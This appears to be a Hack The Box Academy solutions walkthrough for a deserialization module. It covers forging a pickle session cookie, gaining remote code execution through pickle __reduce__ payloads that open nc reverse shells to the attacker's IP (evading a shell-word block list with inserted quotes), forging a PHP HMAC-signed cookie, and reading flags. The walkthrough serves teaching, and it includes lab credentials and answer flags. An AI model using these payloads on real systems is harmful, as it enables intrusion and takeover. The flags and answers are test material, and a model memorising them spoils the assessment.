At last, there are credentials in `/var/www/htbank/creds.txt` that students will require for the question of the section "Avoiding Deserialization Vulnerabilities", which are `htbank:HTBANK_U53R_@ccount`:

Code: shell

```shell
cat /var/www/htbank/creds.txt
```

```shell
cat /var/www/htbank/creds.txt

htbank:HTBANK_U53R_@ccount
```

Answer: `108`

# Identifying a Vulnerability (Python)

## Question 1

### "\[http://SERVER\_IP:5000\] Download the source code for HTBooks and follow along with this section. What line number is pickle.loads() called on in util/auth.py?"

Students first need to download [htbooks-src.zip](https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip && unzip htbooks-src.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip && unzip htbooks-src.zip

--2022-11-16 09:04:50--  https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 926063 (904K) [application/zip]
Saving to: ‘htbooks-src.zip’

htbooks-src.zip                         100%[=============================================================================>] 904.36K  --.-KB/s    in 0.01s   

2022-11-16 09:04:50 (90.6 MB/s) - ‘htbooks-src.zip’ saved [926063/926063]

Archive:  htbooks-src.zip
   creating: htbooks-src/

<SNIP>
```

Afterward, students need to move inside the `/htbook-src` directory and use `grep` to search for the string `pickle.loads` in `util/auth.ph`, utilizing the `-n` (short version of `--line-number`) option to print the line number of the match, which is `37`:

Code: shell

```shell
grep -n "pickle.loads" util/auth.py
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~/htbooks-src]
└──╼ [★]$ grep -n "pickle.loads" util/auth.py

37:    p = pickle.loads(b)
```

Answer: `37`

# Object Injection (Python)

## Question 1

### "\[http://SERVER\_IP:5000\] Forge an admin session and submit the flag from /admin"

After spawning the target machine, students first need to download [htbooks-src.zip](https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip), unzip it, and then move inside the `/htbook-src` directory:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip && unzip htbooks-src.zip && cd htbooks-src/
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-tihlybxmyf]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip && unzip htbooks-src.zip && cd htbooks-src/

--2022-11-16 09:04:50--  https://academy.hackthebox.com/storage/modules/169/htbooks-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 926063 (904K) [application/zip]
Saving to: ‘htbooks-src.zip’

htbooks-src.zip                         100%[=============================================================================>] 904.36K  --.-KB/s    in 0.01s   

2022-11-16 09:04:50 (90.6 MB/s) - ‘htbooks-src.zip’ saved [926063/926063]

Archive:  htbooks-src.zip
   creating: htbooks-src/

<SNIP>
```

Afterward, students need to forge an authentication cookie so that they have the `admin` role instead of the default `user` role, therefore making `isAdmin()` return `true` and access the "Admin" panel. First, for this exploit, students need to set up a folder structure similar to the project `htbook-src`:

Code: shell

```shell
mkdir -p exploit/util/
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-6hj5e7vacq]─[~/htbooks-src]
└──╼ [★]$ mkdir -p exploit/util/
```

Then, students need to create the files `exploit-admin.py` and `auth.py` inside `exploit` and `exploit/util`, respectively:

Code: shell

```shell
touch exploit/exploit-admin.py && touch exploit/util/auth.py
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-6hj5e7vacq]─[~/htbooks-src]
└──╼ [★]$ touch exploit/exploit-admin.py && touch exploit/util/auth.py
```

In `exploit/util/auth.py`, students need to specify the `admin` role and recreate the structure of `Session` (identical to how it is performed in the original `util/auth.py`), and define a custom constructor such that it accepts the parameters `username` and `role`. When serializing a class in Python, the functions defined inside it don't matter but only parameters do, therefore, students can take out the rest of the functions that are inside the original `util/auth.py`:

Code: python

```python
import pickle
import base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
```

Students can use `cat` to insert the Python code into `exploit/util/auth.py`:

Code: shell

```shell
cat << 'EOF' > exploit/util/auth.py
import pickle
import base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-6hj5e7vacq]─[~/htbooks-src]
└──╼ [★]$ cat << 'EOF' > exploit/util/auth.py
> import pickle
import base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
> EOF
```

In `exploit/exploit-admin.py`, students need to instantiate a session with an arbitrary username and the `admin` role and call `util.auth.sessionToCookie` from `exploit/util/auth.py` to attain the corresponding cookie:

Code: python

```python
import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(c.decode())
```

Students can use `cat` to insert the Python code into `exploit/exploit-admin.py`:

Code: shell

```shell
cat << 'EOF' > exploit/exploit-admin.py
import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(c.decode())
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-6hj5e7vacq]─[~/htbooks-src]
└──╼ [★]$ cat << 'EOF' > exploit/exploit-admin.py
> import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(c.decode())
> EOF
```

Subsequently, students need to run `exploit-admin.py` to attain the base64-encoded cookie:

Code: shell

```shell
python3 exploit/exploit-admin.py
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-avlyau8omi]─[~/htbooks-src]
└──╼ [★]$ python3 exploit/exploit-admin.py

gASVRgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwIYXR0YWNrZXKUjARyb2xllIwFYWRtaW6UdWIu
```

Now, students need to navigate to the web root page of the spawned target machine on port 5000 and click on "Log in":

![[HTB Solutions/CWEE/z. images/83ded147b0fe0aeae6452470b26de27e_MD5.jpg]]

Subsequently, students need to utilize the credentials `franz.mueller:bierislekker` (which were provided in the section "Identifying a Vulnerability" under "Exploiting Python Deserialization") to log in:

![[HTB Solutions/CWEE/z. images/4157821cedd76d86a8831a614e48899b_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/045e2702145ce7e5bc576f6d5f0fb720_MD5.jpg]]

Once logged in, students need to hover over "More" and click "Admin Panel":

![[HTB Solutions/CWEE/z. images/2640a73e4660a20b15243bdae35f0d22_MD5.jpg]]

Then, using `cookie-editor` or the Web Developer Tools, students need to replace the cookie value to be the one generated previously by `exploit-admin.py`:

![[HTB Solutions/CWEE/z. images/4b4b97adeb40fa0ea331e51b77630b81_MD5.jpg]]

After refreshing the page, students will find out the flag in the admin dashboard `HTB{203abaf6a820cc75da304c4884c3ab17}`:

![[HTB Solutions/CWEE/z. images/a55a992ad7c8e626385b83f979a36935_MD5.jpg]]

Answer: `HTB{203abaf6a820cc75da304c4884c3ab17}`

# Remote Code Execution

## Question 1

### "\[http://SERVER\_IP:5000\] Using the attack from this section, obtain RCE and submit the contents of flag.txt"

After spawning the target machine, students know that they can control the value being passed to `pickle.loads()`. Moreover, from the section's reading, students know that when a pickled object is unpickled and it contains a definition for `__reduce__` it will be used to restore the original object. Therefore, students need to abuse this by returning a callable object with parameters that result in command execution, escaping the blacklist filters with single quotes:

Code: python

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv PWNIP PWNPO -e /bin/s''h",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
```

Students can use `cat` to insert the Python code into `exploit.py`:

Code: shell

```shell
cat << 'EOF' > exploit.py
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv PWNIP PWNPO -e /bin/s''h",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-avlyau8omi]─[~/htbooks-src]
└──╼ [★]$ cat << 'EOF' > exploit.py
> import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv 10.10.14.107 9001 -e /bin/s''h",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
> EOF
```

Subsequently, students need to run `exploit.py` to attain the base64-encoded cookie:

Code: shell

```shell
python3 exploit.py
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-avlyau8omi]─[~/htbooks-src]
└──╼ [★]$ python3 exploit.py

gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCduJydjIC1udiAxMC4xMC4xNC4xMDcgOTAwMSAtZSAvYmluL3MnJ2iUhZRSlC4=
```

Now, students need to navigate to the web root page of the spawned target machine on port 5000 and click on "Log in":

![[HTB Solutions/CWEE/z. images/621e87c38c994688589e9d0c8fa4ad33_MD5.jpg]]

Subsequently, students need to utilize the credentials `franz.mueller:bierislekker` (which were provided in the section "Identifying a Vulnerability" under "Exploiting Python Deserialization") to log in:

![[HTB Solutions/CWEE/z. images/f5b663e3e2dc67e2cd9881559204e5aa_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f45d86afe57638af616a90e5dd26adad_MD5.jpg]]

Once logged in, students need to hover over "More" and click "Admin Panel":

![[HTB Solutions/CWEE/z. images/96f490ca66b34eafd3d0c9f4a95193e8_MD5.jpg]]

Subsequently, students need to start an `nc` listener using the same port that was specified in `exploit.py` (9001 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-avlyau8omi]─[~/htbooks-src]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Then, using `cookie-editor` or the Web Developer Tools, students need to replace the cookie value to be the one generated previously by `exploit.py`:

![[HTB Solutions/CWEE/z. images/400a9417926425e2aaeb9bbb4e13d9c6_MD5.jpg]]

After refreshing the page, students will notice that the reverse shell connection has been established successfully in the `nc` listener:

```shell
Ncat: Connection from 10.129.93.80.
Ncat: Connection from 10.129.93.80:35430.
whoami

htbooks
```

At last, students need to print out the contents of the flag file "flag.txt", `HTB{09d1d96473483bf0c283fb11fdd3023e}`:

Code: shell

```shell
cat flag.txt
```

```shell
cat flag.txt

HTB{09d1d96473483bf0c283fb11fdd3023e}
```

Answer: `HTB{09d1d96473483bf0c283fb11fdd3023e}`

# Avoiding Deserialization Vulnerabilities

## Question 1

### "\[http://SERVER\_IP:8000\] Spawn the target, SSH in with the credentials you found in /var/www/htbank/creds.txt and follow the section to update HTBank to avoid deserialization vulnerabilities. Once you are done, answer this question: What is the name of the JSON function we used instead of serialize in the settings export functionality?"

At the end of the solution for the question of the section "Exploiting PHP Deserialization - Tools of the Trade", students have attained the credentials `htbank:HTBANK_U53R_@ccount`, therefore, they need to SSH into the spawned target machine using them:

Code: shell

```shell
ssh htbank@STMIP
```

```shell
┌─[eu-academy-1]─[10.10.14.107]─[htb-ac413848@htb-uwmo5sn3am]─[~/phpggc]
└──╼ [★]$ ssh htbank@10.129.93.80

The authenticity of host '10.129.93.80 (10.129.93.80)' can't be established.
ECDSA key fingerprint is SHA256:0AldCBrizQReqjOt7XTMc8JaG/R5K5vLMc1+N2KeMpY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.93.80' (ECDSA) to the list of known hosts.
htbank@10.129.93.80's password: 
Linux academy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 17 04:14:30 2022 from 192.168.0.122
Could not chdir to home directory /home/htbank: No such file or directory
$ 
```

Then, students are highly encouraged to update and secure `HTBank`, following with the section of the module.

The name of the JSON function that was used instead of `serialize` is `json_encode`:

![[HTB Solutions/CWEE/z. images/9867c0a3190de604533295890cab2e8f_MD5.jpg]]

Answer: `json_encode`

# Skills Assessment I

## Question 1

### "\[http://SERVER\_IP:8001\] Achieve RCE and submit the contents of flag.txt"

After spawning the target machine, students need to first understand the web application by visiting it, which is listening on port 8001:

![[HTB Solutions/CWEE/z. images/99248af8980322de66ee7c5f94f9d66d_MD5.jpg]]

Viewing the cookies, by default there are none:

![[HTB Solutions/CWEE/z. images/aa9f5619c509bbd54f3b13a4162d3130_MD5.jpg]]

However, after adding a note (noting that it does not allow to provide the date manually), students will notice that there is a `note` cookie generated with a base64-encoded value:

![[HTB Solutions/CWEE/z. images/ff6f1453b8fc752f65901494ee824f61_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/9a58afbdb6197cc48c00b4d41beb17a8_MD5.jpg]]

Attempting to view the hex dump of the base64-decoded cookie value does not reveal any useful information (therefore it is most probably encrypted):

Code: shell

```shell
echo 'Z0FBQUFBQmpkZlpsNy1FU2JZNWF4T290WUo2blR5QTh0dFVsQTJjek1OeXl2YlNKcEpOay1VYzJ0bDFtLVROYTlEZjZVcGRQVjJfVndha1hiNEpHY0FJUnk1T2twR0JURDNZV0lhd2pSNzNRWTU5YmJjVlF1S1NwRER3WHhHWHZJaEc0TlVCYWlMYWIySUlRcHFmeXJUZmFVZXNVcWh0aUVXYlhsVzEyU2xvTEZrOS1jZ05WRFV2U3plb1M3OC1DNl9ycXloXzBrUUdlMUQ5YmxVTHZ2TDBDWTZ1OHZjWHREQXcxRWZsUmIwMFdVZEJpbEczaFhxZWs2UXJmVHlvajlnRkI4LVVHZmc4dm5nVnV0cHJQX25ubmNISkJSMHViaGJpVmJBRmdwSW4xN1hpaVlSTlVYSUZsSVRiZV9nNGVKUlVyYUtTUjNQeDI=' | base64 -d |xxd
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-of9vzeszfc]─[~/htbrain-src]
└──╼ [★]$ echo 'Z0FBQUFBQmpkZlpsNy1FU2JZNWF4T290WUo2blR5QTh0dFVsQTJjek1OeXl2YlNKcEpOay1VYzJ0bDFtLVROYTlEZjZVcGRQVjJfVndha1hiNEpHY0FJUnk1T2twR0JURDNZV0lhd2pSNzNRWTU5YmJjVlF1S1NwRER3WHhHWHZJaEc0TlVCYWlMYWIySUlRcHFmeXJUZmFVZXNVcWh0aUVXYlhsVzEyU2xvTEZrOS1jZ05WRFV2U3plb1M3OC1DNl9ycXloXzBrUUdlMUQ5YmxVTHZ2TDBDWTZ1OHZjWHREQXcxRWZsUmIwMFdVZEJpbEczaFhxZWs2UXJmVHlvajlnRkI4LVVHZmc4dm5nVnV0cHJQX25ubmNISkJSMHViaGJpVmJBRmdwSW4xN1hpaVlSTlVYSUZsSVRiZV9nNGVKUlVyYUtTUjNQeDI=' | base64 -d |xxd

00000000: 6741 4141 4141 426a 6466 5a6c 372d 4553  gAAAAABjdfZl7-ES
00000010: 6259 3561 784f 6f74 594a 366e 5479 4138  bY5axOotYJ6nTyA8
00000020: 7474 556c 4132 637a 4d4e 7979 7662 534a  ttUlA2czMNyyvbSJ
00000030: 704a 4e6b 2d55 6332 746c 316d 2d54 4e61  pJNk-Uc2tl1m-TNa
00000040: 3944 6636 5570 6450 5632 5f56 7761 6b58  9Df6UpdPV2_VwakX
00000050: 6234 4a47 6341 4952 7935 4f6b 7047 4254  b4JGcAIRy5OkpGBT
00000060: 4433 5957 4961 776a 5237 3351 5935 3962  D3YWIawjR73QY59b
00000070: 6263 5651 754b 5370 4444 7758 7847 5876  bcVQuKSpDDwXxGXv
00000080: 4968 4734 4e55 4261 694c 6162 3249 4951  IhG4NUBaiLab2IIQ
00000090: 7071 6679 7254 6661 5565 7355 7168 7469  pqfyrTfaUesUqhti
000000a0: 4557 6258 6c57 3132 536c 6f4c 466b 392d  EWbXlW12SloLFk9-
000000b0: 6367 4e56 4455 7653 7a65 6f53 3738 2d43  cgNVDUvSzeoS78-C
000000c0: 365f 7271 7968 5f30 6b51 4765 3144 3962  6_rqyh_0kQGe1D9b
000000d0: 6c55 4c76 764c 3043 5936 7538 7663 5874  lULvvL0CY6u8vcXt
000000e0: 4441 7731 4566 6c52 6230 3057 5564 4269  DAw1EflRb00WUdBi
000000f0: 6c47 3368 5871 656b 3651 7266 5479 6f6a  lG3hXqek6QrfTyoj
00000100: 3967 4642 382d 5547 6667 3876 6e67 5675  9gFB8-UGfg8vngVu
00000110: 7470 7250 5f6e 6e6e 6348 4a42 5230 7562  tprP_nnncHJBR0ub
00000120: 6862 6956 6241 4667 7049 6e31 3758 6969  hbiVbAFgpIn17Xii
00000130: 5952 4e55 5849 466c 4954 6265 5f67 3465  YRNUXIFlITbe_g4e
00000140: 4a52 5572 614b 5352 3350 7832            JRUraKSR3Px2
```

Now, students need to download [htbrain-src.zip](https://academy.hackthebox.com/storage/modules/169/htbrain-src.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/169/htbrain-src.zip && unzip htbrain-src.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-of9vzeszfc]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/169/htbrain-src.zip && unzip htbrain-src.zip

--2022-11-17 08:06:13--  https://academy.hackthebox.com/storage/modules/169/htbrain-src.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3935 (3.8K) [application/zip]
Saving to: ‘htbrain-src.zip’

htbrain-src.zip          100%[================================>]   3.84K  --.-KB/s    in 0s      

2022-11-17 08:06:13 (25.3 MB/s) - ‘htbrain-src.zip’ saved [3935/3935]

Archive:  htbrain-src.zip
   creating: htbrain-src/
  inflating: htbrain-src/app.py
 extracting: htbrain-src/requirements.txt
   creating: htbrain-src/templates/
  inflating: htbrain-src/templates/index.html
   creating: htbrain-src/static/
  inflating: htbrain-src/static/script.js
  inflating: htbrain-src/static/style.css
 extracting: htbrain-src/flag.txt
```

Analyzing `htbrain-src/app.py`, students will notice that it is a `Flask` web application that utilizes the `pickle` library for serializing and deserializing data (i.e., the "notes") and the `fernet` cryptography library to perform AES encryption. Students will notice that the web application has only two routes, a GET one for the root page `/` and a POST one for saving notes within a session cookie `/save`.

All what the root route `/` does is call the function `deserialize` on the cookie value, if one exists with the name of `notes`, and deserialize it with the function `deserialize`:

Code: python

```python
@app.route('/')
def index():
    dictionary = {'Title': '', 'Text': '', 'Date': ''}
    if 'notes' in request.cookies:
        try:
            dictionary = deserialize(request.cookies.get('notes'))
        except Exception as e:
            flash(str(e))
    return render_template('index.html', notes=dictionary)
```

While for the `/save` route, it saves the actual notes within a dictionary variable named `dictionary`, consisting of three items/keys "Title", "Text", "Date", with "Date" being set automatically via `datetime`. At last, `dictionary` is serialized by invoking the function `serialize` on it:

Code: python

```python
@app.route('/save', methods=['POST'])
def saveNote():
    dictionary = {'Title': '', 'Text': '',
                  'Date': datetime.now().strftime('%I:%M %p, %d %b %Y')}
    if request.method == 'POST':
        title = request.form['title']
        text = request.form['text']

    dictionary['Title'] = title
    dictionary['Text'] = text
    serialized = serialize(dictionary)
    resp = redirect(url_for('index'))
    resp.set_cookie('notes', serialized)
    return resp
```

Investigating the `deserialize` function, students will notice that it first decrypts the serialized parameter passed to it and then uses `pickle.loads` on it (if it passes the if statements), most importantly, `serialized` is controlled by students as it contains a note's values:

Code: python

```python
def deserialize(serialized):
    try:
        serialized = encryptAES(serialized).decrypt()
    except:
        raise Exception('Invalid session!')
    if not re.search('Title.*?Text.*?Date', str(serialized)):
        raise Exception('Invalid session!')
    dictionary = pickle.loads(serialized)
    if [*dictionary] != ['Title', 'Text', 'Date']:
        raise Exception('Invalid session!')
    return dictionary
```

From the section `Exploiting Python Deserialization - Remote Code Execution` of the module, students know that if a pickled object is unpickled and it contains a definition for `__reduce__`, it will be used to restore the original object, therefore, students need to abuse this to return a callable object with parameters that will result in command execution. Students need to define a class named `RCE` and override `__reduce__` to execute an `nc` reverse shell command:

Code: python

```python
class RCE():
	def __reduce__(self):
		return os.system, ("nc -nv PWNIP PWNPO -e /bin/bash",)
```

The dummy "note" that will be used to generate the malicious revere shell cookie will assign the item "Date" with what the function `RCE` returns, subsequently, it will be serialized with `pickle.dumps` and then encrypted with the function `encrypt` of the class `encryptAES`, utilizing the password `@s3cur3P!ck13K3y`:

Code: python

```python
note = {"Title":"","Text":"","Date":RCE()}

s = pickle.dumps(note)
e = encryptAES(s).encrypt()
```

The final Python script to generate the malicious cookie is (the `decrypt` function of the class `encryptAES` is unnecessary and can be deleted):

Code: python

```python
#!/usr/bin/python3

import os
import pickle
import base64
import hashlib
from cryptography.fernet import Fernet

SECRET_KEY = '@s3cur3P!ck13K3y'

class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(SECRET_KEY.encode()).digest()[:32])
        self.f = Fernet(self.key)
    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()
    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)

class RCE():
	def __reduce__(self):
		return os.system, ("nc -nv PWNIP PWNPO -e /bin/bash",)

note = {"Title":"","Text":"","Date":RCE()}

s = pickle.dumps(note)
e = encryptAES(s).encrypt()
print(e)
```

Students can use `cat` to save the Python script into a file:

Code: shell

```shell
cat << 'EOF' > generateCookie.py
#!/usr/bin/python3

import os
import pickle
import base64
import hashlib
from cryptography.fernet import Fernet

SECRET_KEY = '@s3cur3P!ck13K3y'

class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(SECRET_KEY.encode()).digest()[:32])
        self.f = Fernet(self.key)
    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()
    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)

class RCE():
        def __reduce__(self):
                return os.system, ("nc -nv PWNIP PWNPO -e /bin/bash",)

notes = {"Title":"","Text":"","Date":RCE()}

s = pickle.dumps(notes)
e = encryptAES(s).encrypt()
print(e)
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~/htbrain-src]
└──╼ [★]$ cat << 'EOF' > generateCookie.py
> #!/usr/bin/python3

import os
import pickle
import base64
import hashlib
from cryptography.fernet import Fernet

SECRET_KEY = '@s3cur3P!ck13K3y'

class encryptAES:
    def __init__(self, data):
        self.data = data
        self.key = base64.b64encode(hashlib.sha256(SECRET_KEY.encode()).digest()[:32])
        self.f = Fernet(self.key)
    def encrypt(self):
        encrypted = self.f.encrypt(self.data)
        return base64.b64encode(encrypted).decode()
    def decrypt(self):
        encrypted = base64.b64decode(self.data)
        return self.f.decrypt(encrypted)

class RCE():
        def __reduce__(self):
                return os.system, ("nc -nv 10.10.14.162 9001 -e /bin/bash",)

notes = {"Title":"","Text":"","Date":RCE()}

s = pickle.dumps(notes)
e = encryptAES(s).encrypt()
print(e)
> EOF
```

Subsequently, students need to run the scrip to attain the cookie:

Code: shell

```shell
python3 generateCookie.py
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~/htbrain-src]
└──╼ [★]$ python3 generateCookie.py

Z0FBQUFBQmpkaFM1U3hTV0taYTltUWlKTGNCUlh4OGtjTjJhaTB1UlhJSXZ0QWktNTU1QVgwelducEZ1M1Q4bzZhSFVBblJUM2s5NVl1QlMtNkp5WUI5WE45Z3BOLXFMTXdVQWwtb2stcDZxbWdBZ0l2VEtvMno2Z20wMnJQQ3BjaVpDcm12NnE2T1RTUHRCaHprUHctSnZMX2ZGcnU4VUJ3Znl0TlROeF9pZ25SNlA5eWJkbWRTQkxESVVVT2oyM2tKVkZxN2NwTktSZ2RmbEVBTW5YN2s0V0lXQTk0T3NGUT09
```

Before utilizing the cookie, students need to start an `nc` listener with the same port that was specified in the overridden `__reduce__` function (9001 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~/htbrain-src]
└──╼ [★]$ nc -nvlp 9001

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

Thereafter, students need to go back to the web application on port 8001, replace the cookie value with the one generated by the script, and then refresh the page, to notice that the reverse shell connection has been successfully established in the `nc` listener:

![[HTB Solutions/CWEE/z. images/16784cf04cffc26e6e3a5177894d3473_MD5.jpg]]

```shell
Ncat: Connection from 10.129.204.98.
Ncat: Connection from 10.129.204.98:42110.
whoami

htbrain
```

At last, students need to print out the contents of the flag file "flag.txt", `HTB{e108090de0e4c1404a00ed1faf4fd2c5}`:

Code: shell

```shell
cat flag.txt
```

```shell
cat flag.txt

HTB{e108090de0e4c1404a00ed1faf4fd2c5}
```

Answer: `HTB{e108090de0e4c1404a00ed1faf4fd2c5}`

# Skills Assessment II

## Question 1

### "\[http://SERVER\_IP:8080\] Obtain admin access and submit the flag you get"

After spawning the target machine, students need to navigate to its website's root page on port 8080, to notice that at the footer it says "Powered by CodeIgniter 4.2.7", which is a [PHP web application framework](https://codeigniter.com/):

![[HTB Solutions/CWEE/z. images/787f31c828cdf6d64770fcef6d35a8d2_MD5.jpg]]

Viewing the page's source, students will find exposed HTML comments with the password `@pp_s3ret!!` and that the backend uses `SHA1` for hashing (most probably):

![[HTB Solutions/CWEE/z. images/51ce60cc6cd6048df8d6a490e10f46b2_MD5.jpg]]

Subsequently, students need to register an account:

![[HTB Solutions/CWEE/z. images/8a6037231ef775b9a74f5f4d4cab637b_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/410bc54955a0cb47f189cda0168cda68_MD5.jpg]]

Afterward, students will be redirected to log in:

![[HTB Solutions/CWEE/z. images/190f3bae7221846270cf03f34c2f202d_MD5.jpg]]

After logging successfully and checking the cookies, students will find one by the name of `auth` with a base64-encoded value:

![[HTB Solutions/CWEE/z. images/9f5c7d4e19ab1c99ffe0cdb0f06db64c_MD5.jpg]]

Decoding the cookie value, students will notice that it is an array of 3 string elements, "id", "username", and "role" serialized with PHP:

Code: shell

```shell
echo 'YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NDoidGVzdCI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.b7d257a0d366e69e1316961d3cfa89934abee2e5' | base64 -d
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~]
└──╼ [★]$ echo 'YTozOntzOjI6ImlkIjtzOjE6IjMiO3M6ODoidXNlcm5hbWUiO3M6NDoidGVzdCI7czo0OiJyb2xlIjtzOjE6IjEiO30%3D.b7d257a0d366e69e1316961d3cfa89934abee2e5' | base64 -d

a:3:{s:2:"id";s:1:"3";s:8:"username";s:4:"test";s:4:"role";s:1:"1";}base64: invalid input
```

If students attempt to serialize a similar object with the role 0 (i.e., admin) and replace the cookie in the web application, it will fail, because from the exposed HTML comments, the backend most probably uses `HMACS` with the `sha1` algorithm. Therefore, students need create a PHP script that will generate a base64-encoded cookie with the role set to 0 and the HMAC secret appended to it:

Code: php

```php
<?php

$APP_SECRET = "@pp_s3cret!!";

$arr = array('id' => 'test', 'username' => 'test', 'role' => '0');
$ser = serialize($arr);

$hmac = hash_hmac("sha1", $ser, $APP_SECRET);

echo base64_encode($ser) . "." . $hmac;
```

Students can use `cat` to save the PHP script into a file:

Code: shell

```shell
cat << 'EOF' > generateCookie.php 
<?php

$APP_SECRET = "@pp_s3cret!!";

$arr = array('id' => 'test', 'username' => 'test', 'role' => '0');
$ser = serialize($arr);

$hmac = hash_hmac("sha1", $ser, $APP_SECRET);

echo base64_encode($ser) . "." . $hmac;
EOF
```

```shell
┌─[eu-academy-1]─[10.10.14.162]─[htb-ac413848@htb-qmmsulophr]─[~]
└──╼ [★]$ cat << 'EOF' > generateCookie.php 
<?php

$APP_SECRET = "@pp_s3cret!!";

